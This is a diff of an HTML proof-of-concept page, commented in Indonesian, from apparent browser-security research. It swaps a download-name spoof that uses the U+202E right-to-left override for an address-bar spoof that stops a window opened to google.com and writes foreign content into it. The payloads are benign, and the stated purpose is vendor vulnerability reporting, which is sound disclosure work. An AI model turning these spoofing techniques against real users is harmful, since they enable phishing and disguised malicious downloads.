@@ -1,82 +1,14 @@
-<!-- MEKANISME: rak unduhan hanya merender NAMA berkas; nama itu string milik halaman, dan U+202E (RLO) membalik urutan tampilnya sehingga ekstensi yang tertulis di rak berbeda dari ekstensi sebenarnya di disk. -->
-<!DOCTYPE html>
-<html lang="id">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>19 — Atribusi rak unduhan: nama berkas ber-override RTL</title>
-<style>
-  *{box-sizing:border-box}
-  body{font:15px/1.55 system-ui,Segoe UI,Roboto,sans-serif;margin:0;padding:1rem;color:#111;background:#fff}
-  .p{border:2px solid #d33;border-radius:12px;padding:.9rem 1rem;max-width:720px;margin:0 auto}
-  h2{font-size:1.08rem;margin:.1rem 0 .6rem}
-  .kv{display:grid;grid-template-columns:11rem 1fr;gap:.28rem .7rem;font-size:.9rem}
-  .kv b{color:#555;font-weight:600}
-  code{background:#f2f2f2;padding:.08rem .32rem;border-radius:4px;word-break:break-all}
-  .vuln{color:#d33;font-weight:700}.sec{color:#0a7;font-weight:700}
-  button{font:inherit;padding:.5rem .9rem;border:1px solid #888;border-radius:9px;background:#fafafa;cursor:pointer;margin:.15rem .3rem .15rem 0}
-  button.k{background:#d33;color:#fff;border-color:#b22}
-  pre{font:12.5px/1.5 ui-monospace,Consolas,monospace;background:#0d1117;color:#c9d1d9;border-radius:9px;padding:.6rem .7rem;white-space:pre-wrap;min-height:4.5rem;margin:.7rem 0 0}
-  .n{font-size:.82rem;color:#777}
-  @media(prefers-color-scheme:dark){body{background:#161616;color:#eee}.kv b{color:#aaa}code{background:#2a2a2a}}
-</style>
-</head>
-<body>
-<div class="p">
-  <h2>19 — Atribusi rak unduhan: nama berkas ber-override RTL (U+202E)</h2>
-
-  <div class="kv">
-    <b>URL asli halaman</b><span class="sec" id="real">…</span>
-    <b>Isi berkas</b><span>teks biasa (<code>text/plain</code>) yang dibuat di halaman ini — bukan .exe/.apk/skrip</span>
-    <b>Nama sebenarnya</b><span class="vuln" id="realName">…</span>
-    <b>Perkiraan tampilan</b><span class="vuln" id="shownName">…</span>
-    <b>Nama kontrol</b><span class="sec" id="ctlName">…</span>
-  </div>
-
-  <p style="margin:.8rem 0 .2rem">
-    <button class="k" id="vulnBtn">Unduh: nama dengan U+202E</button>
-    <button id="ctlBtn">KONTROL: nama sama tanpa U+202E</button>
-  </p>
-
-  <p class="n" style="margin:.2rem 0 0">
-    <b>VULNERABLE:</b> rak/panel unduhan menulis nama yang <i>berbeda</i> dari “nama sebenarnya” di atas —
-    ekstensi yang terlihat bukan <code>.txt</code>.<br>
-    <b>SECURE:</b> rak menulis persis “nama sebenarnya”, atau browser menetralkan/menghapus U+202E sehingga
-    ekstensi <code>.txt</code> tetap terbaca di ujung.<br>
-    <b>Baseline aman</b> = tombol KONTROL (mekanisme RLO dihapus): tampilan rak wajib sama dengan nama kontrol.
-    Bandingkan kedua entri pada rak yang sama dalam satu tangkapan layar.
-  </p>
-
-  <pre id="log"></pre>
-  <p class="n">Berkas yang tersimpan adalah teks biasa berisi catatan PoC; hapus saja setelah diamati.</p>
-</div>
-
+<!-- 12 - window.stop() di anak (render-hang)   [address-bar spoofing | macOS: Dia/Arc/Chrome/Safari macOS]
+     MEKANISME : HOLD tanpa jaringan: anak dinavigasi ke URL tepercaya lalu di-stop() sebelum commit, dokumen lama tetap hidup.
+     PREDIKAT  : bilah anak menulis https://www.google.com sementara isinya ditulis pembuka.
+     AMAN      : stop() tidak menahan tampilan bilah.
+     ETIKA     : browser & mesin sendiri. Nol form, nol kredensial, nol fetch/beacon, nol resource luar.
+                 "www.google.com" = label tak-berbahaya; example.com = origin uji (IANA reserved).
+                 Berhenti di predikat -> screenshot -> lapor VRP. Bukan kit phishing. -->
+<meta charset="utf-8"><title>12 window.stop() di anak (render-hang)</title>
+<button onclick="go()" style="font:16px system-ui;padding:12px 22px">RUN</button>
+<p id="o" style="font:12px ui-monospace,monospace;color:#555"></p>
 <script>
-var RLO = "‮";
-var VULN_NAME = "DEMO-poc-" + RLO + "fdp.txt";
-var CTL_NAME  = "DEMO-poc-fdp.txt";
-function $(i){ return document.getElementById(i); }
-function log(s){ $("log").textContent += s + "\n"; }
-function esc(s){ return s.replace(/‮/g, "[U+202E RLO]"); }
-function drop(name, tag){
-  var a = document.createElement("a");
-  if (!("download" in a) || !window.Blob || !window.URL || !URL.createObjectURL){
-    log("tidak didukung di browser ini (a[download] / Blob / URL.createObjectURL)"); return;
-  }
-  var body = "DEMO PoC riset keamanan.\nBerkas ini teks biasa, dibuat oleh halaman: " + location.href + "\n";
-  var url = URL.createObjectURL(new Blob([body], {type: "text/plain"}));
-  a.href = url; a.download = name; a.style.display = "none";
-  document.body.appendChild(a); a.click(); document.body.removeChild(a);
-  setTimeout(function(){ URL.revokeObjectURL(url); }, 5000);
-  log("[" + tag + "] nama yang diminta halaman (unit kode) = " + esc(name));
-  log("[" + tag + "] periksa rak unduhan: nama apa yang tertulis di sana?");
-}
-$("real").textContent = location.href;
-$("realName").textContent = esc(VULN_NAME);
-$("shownName").textContent = "DEMO-poc-txt.pdf";
-$("ctlName").textContent = CTL_NAME;
-$("vulnBtn").onclick = function(){ drop(VULN_NAME, "vuln"); };
-$("ctlBtn").onclick  = function(){ drop(CTL_NAME, "control"); };
+o.textContent='REAL: '+location.origin;
+function go(){var w=window.open('https://www.google.com/','x');setTimeout(function(){try{w.stop();w.document.write('<h3>BUKAN google.com - '+location.origin+'</h3>');}catch(e){o.textContent='stop/write ditolak: '+e.name;}},60);}
 </script>
-</body>
-</html>
